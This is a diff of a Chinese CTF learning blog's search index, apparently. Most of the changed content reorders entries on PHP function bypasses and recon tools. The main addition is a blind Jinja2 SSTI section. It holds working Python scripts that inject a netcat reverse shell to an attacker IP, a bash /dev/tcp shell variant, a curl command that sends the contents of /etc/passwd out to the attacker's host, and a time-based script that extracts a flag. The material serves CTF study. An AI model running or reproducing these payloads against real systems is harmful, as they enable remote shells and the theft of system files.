@@ -34,19 +34,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Wappalyzer</title>
-    <url>/2024/07/24/Wappalyzer/</url>
-    <content><![CDATA[<p>&emsp;&emsp;Wappalyzer是一款开源的浏览器扩展，用于识别网站所使用的技术栈。它能够检测出使用的Web服务器、内容管理系统、编程语言、JavaScript库、框架等信息，并将其展示给用户。知道大体框架后，能为后面的查找和思路提供一些方便，闲着没事的时候就可以点一下，又没什么影响( ͡°❥ ͡°)。下载方法也很简单，同hackbar在扩展上搜索一下就是的啦。实用指数:⭐⭐⭐⭐</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSTI注入</title>
     <url>/2024/08/08/SSTI%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>&emsp;&emsp;SSTI是一种服务器端模板注入漏洞，它出现在使用模板引擎的web应用程序中。模块引擎是一种将动态数据与静态模板结合生成最终输出的工具。然而，如果在构建模板时未正确处理用户输入，就可能导致SSTI漏洞的产生。</p>
@@ -74,7 +61,16 @@
 
 <h4 id="linecache函数执行命令"><a href="#linecache函数执行命令" class="headerlink" title="linecache函数执行命令"></a>linecache函数执行命令</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">查询注入模块 linecache</span></span><br><span class="line"><span class="language-xml">(用查询脚本的修改部分)</span></span><br><span class="line"><span class="language-xml">data=&#123;&quot;post参数&quot;:&quot;</span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__bases__</span>[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;</span><span class="language-xml">&quot;&#125;</span></span><br><span class="line"><span class="language-xml">if &#x27;linecache&#x27; in response.text:</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[191].__init__.__globals__.linecache.os.popen(<span class="name">&quot;ls -l /&quot;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">查询注入模块 subprocess.Popen</span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[200](<span class="name">&quot;tac flag&quot;</span>,<span class="attr">shell</span>=<span class="literal">True</span>,<span class="attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
+<h4 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">查询注入模块 subprocess.Popen</span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[200](<span class="name">&quot;tac flag&quot;</span>,<span class="attr">shell</span>=<span class="literal">True</span>,<span class="attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h3><p>&emsp;&emsp;那有人就要问了，哎呀，题目没有回显怎么办啊，简单~(用脚本无脑都可以)</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1&quot;</span> <span class="comment">#URL</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;post参数&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.5.51(kaliIP) 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#或者&quot;bash -i &gt;&amp; /dev/tcp/XXXX(服务器/跳板)/XXXX（端口号） 0&gt;&amp;1&quot;</span></span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;同时kali监听(nc -lnvp 7777)即可。</p>
+<h4 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">import requests</span></span><br><span class="line"><span class="language-xml">url = &quot;http://127.0.0.1:&quot; #URL</span></span><br><span class="line"><span class="language-xml">for i in range(300):</span></span><br><span class="line"><span class="language-xml">    try:</span></span><br><span class="line"><span class="language-xml">        data=&#123;&quot;post参数&quot;:&#x27;</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](<span class="name">&quot;curl http://192.168.5.51(kaliIP)/`cat /etc/passwd`&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;&#125;</span></span><br><span class="line"><span class="language-xml">        response = requests.post(url,data=data)</span></span><br><span class="line"><span class="language-xml">    except:</span></span><br><span class="line"><span class="language-xml">        pass</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;同时kali开启一个python http监听(python3 -m http.server 80)</p>
+<h4 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h4><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">import requests</span></span><br><span class="line"><span class="language-xml">import time</span></span><br><span class="line"><span class="language-xml">url = input(&quot;请输入 URL：&quot;)</span></span><br><span class="line"><span class="language-xml">request_parameter = input(&quot;请输入 POST 请求参数：&quot;)</span></span><br><span class="line"><span class="language-xml">cs = &quot; !\&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="language-xml">flag = &quot;&quot;</span></span><br><span class="line"><span class="language-xml"># range() 参数为 脚本2 得到的 flag 长度</span></span><br><span class="line"><span class="language-xml">for i in range(25):</span></span><br><span class="line"><span class="language-xml">    low = 0</span></span><br><span class="line"><span class="language-xml">    high = len(cs)</span></span><br><span class="line"><span class="language-xml">    while low<span class="tag">&lt;<span class="name">high:</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">index</span> = <span class="string">low</span> + (<span class="attr">high</span> <span class="attr">-</span> <span class="attr">low</span>) // <span class="attr">2</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">start_time</span> = <span class="string">time.time()</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        # <span class="attr">request_parameter</span> <span class="attr">为</span> <span class="attr">post</span> <span class="attr">传入数据的参数名</span>，<span class="attr">根据实际情况输入</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">data</span> = <span class="string">&#123;</span> <span class="attr">request_parameter:</span>&quot;</span></span><span class="template-tag">&#123;%</span><span class="name">set</span> flag=().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat flag\&quot;).read()&#x27;</span>)<span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span><span class="name">if</span> flag[<span class="string">&quot;+str(i)+&quot;</span>]==<span class="string">&#x27;&quot;+cs[index]+&quot;&#x27;</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;time\&quot;).sleep(2)&#x27;</span>)&#125;&#125;</span><span class="template-tag">&#123;%</span><span class="name">elif</span> flag[<span class="string">&quot;+str(i)+&quot;</span>]&gt;<span class="string">&#x27;&quot;+cs[index]+&quot;&#x27;</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;time\&quot;).sleep(4)&#x27;</span>)&#125;&#125;</span><span class="template-tag">&#123;%</span><span class="name">endif</span><span class="template-tag">%&#125;</span><span class="language-xml"><span class="tag">&quot; &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">response</span> = <span class="string">requests.post(url,</span> <span class="attr">data</span>=<span class="string">data)</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">end_time</span> = <span class="string">time.time()</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        # <span class="attr">计算响应时间</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">response_time</span> = <span class="string">end_time</span> <span class="attr">-</span> <span class="attr">start_time</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">if</span> <span class="attr">response_time</span> &gt;</span>=2 and response_time&lt;=4:</span></span><br><span class="line"><span class="language-xml">            flag+=cs[index]</span></span><br><span class="line"><span class="language-xml">            print(cs[index],end=&#x27;\t&#x27;)</span></span><br><span class="line"><span class="language-xml">            low = high</span></span><br><span class="line"><span class="language-xml">        elif response_time&gt;4:</span></span><br><span class="line"><span class="language-xml">            low = index+1</span></span><br><span class="line"><span class="language-xml">        else:</span></span><br><span class="line"><span class="language-xml">            high = index</span></span><br><span class="line"><span class="language-xml">print(&quot;\n&quot;+flag)</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;二分法直接爆破flag。</p>
+]]></content>
       <categories>
         <category>SSTI</category>
       </categories>
@@ -84,19 +80,36 @@
       </tags>
   </entry>
   <entry>
-    <title>eregi</title>
-    <url>/2024/07/17/eregi/</url>
-    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
+    <title>Wappalyzer</title>
+    <url>/2024/07/24/Wappalyzer/</url>
+    <content><![CDATA[<p>&emsp;&emsp;Wappalyzer是一款开源的浏览器扩展，用于识别网站所使用的技术栈。它能够检测出使用的Web服务器、内容管理系统、编程语言、JavaScript库、框架等信息，并将其展示给用户。知道大体框架后，能为后面的查找和思路提供一些方便，闲着没事的时候就可以点一下，又没什么影响( ͡°❥ ͡°)。下载方法也很简单，同hackbar在扩展上搜索一下就是的啦。实用指数:⭐⭐⭐⭐</p>
 ]]></content>
       <categories>
-        <category>PHP</category>
+        <category>WEB</category>
       </categories>
       <tags>
-        <tag>函数绕过</tag>
+        <tag>工具|脚本 利用</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dirsearch</title>
+    <url>/2024/07/23/dirsearch/</url>
+    <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;安装完之后就是安装依赖</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>进入dirsearch目录</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>可以tab补全，不能执行就用sudo</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;之后执行dirsearch.py</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//查看帮助</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//扫描开始</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;以上就是常规用法，知道扫描就行了。（后期帮助不大）</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>工具|脚本 利用</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -125,26 +138,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dirsearch</title>
-    <url>/2024/07/23/dirsearch/</url>
-    <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;安装完之后就是安装依赖</p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>进入dirsearch目录</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>可以tab补全，不能执行就用sudo</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;之后执行dirsearch.py</p>
-<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//查看帮助</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//扫描开始</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;以上就是常规用法，知道扫描就行了。（后期帮助不大）</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>工具|脚本 利用</tag>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hackbar</title>
     <url>/2024/07/13/hackbar/</url>
     <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
@@ -155,6 +148,41 @@
       <tags>
         <tag>基础</tag>
         <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>intval</title>
+    <url>/2024/07/12/intval/</url>
+    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
+<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;输出</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
+<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>eregi</title>
+    <url>/2024/07/17/eregi/</url>
+    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -170,6 +198,39 @@
       </categories>
       <tags>
         <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>is_numberic</title>
+    <url>/2024/07/13/is-numberic/</url>
+    <content><![CDATA[<p>&emsp;&emsp;is_numeric()函数用于检查变量是否为数字或数字字符串。属于布尔类型，如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意<font color=red>浮点型返回空值，即FALSE。</font></p>
+<h3 id="空字符绕过"><a href="#空字符绕过" class="headerlink" title="空字符绕过"></a>空字符绕过</h3><p>&emsp;&emsp;可以借助URL编码中的空字符，例如%00或者%20，其中%00加在前面或者后面都可以，也就是%00404或者404%00，而%20只能放在末尾，比如404%20（%20准确来说是空格字符）  </p>
+<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">数字--&gt;非数字：</span><br><span class="line">数值<span class="comment">%20</span></span><br><span class="line"><span class="comment">%00数值</span></span><br><span class="line">数值<span class="comment">%00</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;当然还可以这样构造:</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">num</span>=1&#x27;</span><br><span class="line">?<span class="attribute">num</span>=1,</span><br><span class="line">?<span class="attribute">num</span>=1%00</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;都可以绕过判断</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 其实题目的核心是弱比较的特性，我们只要知道这个函数的返回类型和作用就过关了(っ◞‸◟c)</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php_filter_chain_generator</title>
+    <url>/2024/07/14/php-filter-chain-generator/</url>
+    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，实用指数:⭐⭐⭐脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
+<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
       </tags>
   </entry>
   <entry>
@@ -214,58 +275,6 @@
       </tags>
   </entry>
   <entry>
-    <title>intval</title>
-    <url>/2024/07/12/intval/</url>
-    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
-<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;输出</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
-<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>函数绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php_filter_chain_generator</title>
-    <url>/2024/07/14/php-filter-chain-generator/</url>
-    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，实用指数:⭐⭐⭐脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
-<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>is_numberic</title>
-    <url>/2024/07/13/is-numberic/</url>
-    <content><![CDATA[<p>&emsp;&emsp;is_numeric()函数用于检查变量是否为数字或数字字符串。属于布尔类型，如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意<font color=red>浮点型返回空值，即FALSE。</font></p>
-<h3 id="空字符绕过"><a href="#空字符绕过" class="headerlink" title="空字符绕过"></a>空字符绕过</h3><p>&emsp;&emsp;可以借助URL编码中的空字符，例如%00或者%20，其中%00加在前面或者后面都可以，也就是%00404或者404%00，而%20只能放在末尾，比如404%20（%20准确来说是空格字符）  </p>
-<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">数字--&gt;非数字：</span><br><span class="line">数值<span class="comment">%20</span></span><br><span class="line"><span class="comment">%00数值</span></span><br><span class="line">数值<span class="comment">%00</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;当然还可以这样构造:</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">num</span>=1&#x27;</span><br><span class="line">?<span class="attribute">num</span>=1,</span><br><span class="line">?<span class="attribute">num</span>=1%00</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;都可以绕过判断</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp; 其实题目的核心是弱比较的特性，我们只要知道这个函数的返回类型和作用就过关了(っ◞‸◟c)</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>函数绕过</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php入门</title>
     <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<p>&emsp;&emsp;对于刚接触web题的时候，最先掌握的语言应该是php，不说所有知识点要了解，起码打web题的时候GET和POST方法要会辨别和使用，推荐PHP学习网站  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;生怕你们不会点，超链接都没有弄(っ’-‘)╮&#x3D;͟͟͞͞🎁) ﾟдﾟ ）</p>
@@ -280,26 +289,6 @@
       </categories>
       <tags>
         <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>preg_replace</title>
-    <url>/2024/07/12/preg-replace/</url>
-    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
